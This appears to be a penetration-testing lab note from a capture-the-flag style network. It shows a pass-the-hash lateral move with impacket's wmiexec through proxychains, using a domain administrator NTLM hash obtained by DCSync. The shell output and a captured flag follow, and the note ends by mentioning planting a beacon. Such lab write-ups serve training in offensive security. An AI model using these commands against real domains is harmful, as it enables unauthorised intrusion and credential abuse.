[[Whats the worst that could happen]]

once we owned the `CORP` domain through `DCSYNC`'ing the `DA` hashes are able to be used anywhere in the domain, this allowed us to just `wmiexec` into the file server
```powershell
┌──(root💀gobots)-[03Jan2024 13:59:42]-[~]                                                                                                                           
└─# proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:70016778cb0524c799ac25b439bd67e0 CORP.LOCAL/iamtheadministrator@172.16.1.26            
[proxychains] config file found: /etc/proxychains4.conf                                                                                                                                                     
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                                                                                                      
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                                    
                                                                                                                                                                                                            
[*] SMBv3.0 dialect used                                                                                                                                                                                    
[!] Launching semi-interactive shell - Careful what you execute                                                                                                                                             
[!] Press help for extra shell commands                                                                                                                                                                     
C:\>whoami                                                                                                                                                                                                  
corp\iamtheadministrator       
```
![[Pasted image 20240103140721.png]]
```powershell
C:\users\Administrator\Desktop>type flag.txt
OFFSHORE{f1l3_s3rv3rs_h0ld_ju1cy_d@ta}
```

![[Pasted image 20240103140818.png]]

put a beacon on the machine
